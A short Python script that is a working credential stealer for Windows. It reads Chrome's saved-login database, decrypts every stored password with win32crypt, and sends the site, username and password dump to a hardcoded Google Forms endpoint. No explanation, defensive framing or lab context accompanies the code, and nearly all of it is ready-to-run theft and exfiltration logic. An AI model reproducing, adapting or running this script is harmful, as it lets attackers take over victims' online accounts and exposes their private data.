from os import getenv
import sqlite3
import win32crypt
import urllib.request

#Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()

#Lets get the results
data=""
cursor.execute('Select action_url, username_value, password_value FROM logins')
data= data+("Chrome Saved Passwords\n")
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        data = data +('\nThe website is '+result[0])
        data = data +('\nThe Username is '+result[1])
        data = data +('\n The password is ' + str(password))

#Send to Google forms
url = "https://docs.google.com/forms/d/e/1FAIpQLSeZDjalqbMkiobv96KIQePCBhzsGHnM80FfRsZVqI4W3iGhrw/formResponse"  # Specify Google Form URL here
klog = {'entry.930665253': data}  # Specify the Field Name here

try:
    dataenc = urllib.parse.urlencode(klog)
    dataenc = dataenc.encode('ascii')
    req = urllib.request.Request(url, dataenc)
    response = urllib.request.urlopen(req)
    data = ''
except Exception as e:
    print(e)
